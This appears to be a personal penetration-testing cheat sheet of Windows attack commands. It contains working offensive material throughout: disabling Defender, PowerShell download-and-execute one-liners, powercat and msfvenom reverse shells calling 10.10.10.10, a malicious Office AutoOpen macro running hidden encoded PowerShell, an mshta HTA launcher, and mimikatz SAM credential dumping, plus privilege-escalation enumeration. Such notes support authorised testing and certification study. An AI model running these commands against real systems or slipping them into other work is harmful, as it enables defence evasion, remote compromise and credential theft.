- Disable Defender
    - Set-MpPreference -DisableRealtimeMonitoring $true
- C compile to exe in linux `i686-w64-mingw32-gcc adduser.c -o adduser.exe`

# Windows file transfers
- Powershell
    -   `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/wget.exe','C:\Windows\Temp\wget.exe')"`
    -   `iex(iwr http://10.10.10.10/shell.exe)`
- Recieve file with powercat(send file with nc) `powercat -c 10.10.10.10 -p 443 -i file.txt`
- Exe to Hex 
	- `exe2hex -x nc.exe -p nc.cmd` 
	- `powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l- 1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles ]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"`


# Windows shells
- Kali has nc.exe at /usr/share/windows-resources/binaries/nc.exe
- C# compile + run
    - `C:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /t:exe /out:C:\windows\temp\rev.exe C:\windows\temp\rev.cs`
- Powershell 
    - [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
    - [Powershell-OneLinerReverseShell](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1)
    - [Environment]::Is64BitProcess
    - `cat shell.ps1 | iconv -t utf-16le | base64 -w 0` encode a powershell command for windows format
    - powershell -ep bypass -noprofile -WindowStyle Hidden -e UYGfxemu...
- Powercat
    - Generate reverse shell `powercat -c 10.10.10.10 -p 443 -e cmd.exe -g`
    - Encoded reverse shell `powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge`
    - Reverse shell `powercat -c 10.10.10.10 -p 443 -e cmd.exe`
    - Bind shell `powercat -l -p 443 -e cmd.exe`
    - Listener `powercat -l -p 443` 
- HTA (mshta.exe http://ip/rev.hta)
```
<html>
<body>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
- VBS (MS office)
```
Sub AutoOpen() 
	MyMacro
End Sub
Sub Document_Open() 
	MyMacro
End Sub
Sub MyMacro()
	Dim Str As String
	Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
	Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB" 
	Str = Str + "TAH...6A"
CreateObject("Wscript.Shell").Run Str 
End Sub
```
- Msf
    -   Powershell `msfvenom -p cmd/windows/reverse_powershell lhost=10.10.10.10 lport=80`
    -   MSHTA
    	-	msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o shell.hta   
        -   use exploit/windows/misc/hta_server
        -   mshta.exe hxxp://10.10.65.86:8080/VlHPpQahHBNkkeX.hta  

# Windows privilege escalation
- Tools - [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
- [LOLbas](https://lolbas-project.github.io/)
- whoami
- net user
- `powershell ls env:`
- User member of which groups `net user USERNAME`
- Get hostname to understand functionality of box `hostname`
- Get system info `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Running process `tasklist /SVC`
- Get Process statsus `wmic service where caption="Serviio" get name, caption, state, startmode`
- Start/Stop service `net start Serviio``net stop Serviio`
- Get networking info `ipconfig /all` `route print`
- Networking connections `netstat -ano`
- Firewall
	- current profile for firewall `netsh advfirewall show currentprofile`
	- Firewall rules `netsh advfirewall firewall show rule name=all`
- Scheduled Tasks `schtasks /query /fo LIST /v`
- Installed applications `wmic product get name, version, vendor`
- Security patches `wmic qfe get Caption, Description, HotFixID, InstalledOn`
- Writable files
	- `accesschk.exe -uws "Everyone" "C:\Program Files"`
	- `Get-ChildItem "C:\Program Files" - Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
- File permissions with Icacls
	- `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
	- F M RX R W = Full Modify Read&Execute Read-only Write-only
- Unmounted disks `mountvol`
- Windows Drivers
	- `driverquery /v` searchsploit the driver name
	- `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path`
	- `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`
- Auto elevate `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` `reg queryHKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
- Get intigrity of session(High/Medium/Low in bottom of o/p) `whoami /groups`
- Run as diffrent user `powershell.exe Start-Process cmd.exe -Verb runAs`
- whoami /priv
	- SeShutdownPrivilege = We can restart `shutdown /r /t 0`
	- SeImpersonatePrivilege on Windows 10 and Server 2016/2019 
		- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
		- [https://github.com/Genetic-Malware/Ebowla](https://github.com/Genetic-Malware/Ebowla)
 
- Unquoted Service Paths `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
- 
### mimikatz.exe
- `privilege::debug` `token::elevate` 
- Dump SAM `lsadump::sam` 

### General windows security/protectcions
1. Resource
	- Security discriptors
		- Owner 
		- Group
		- ACLs
2. SRM checks
	- Intigrity level
	- Owner
	- ACL
3. Process
	- Access tokens
4. Kernel
	- Verification by security refrence monitor
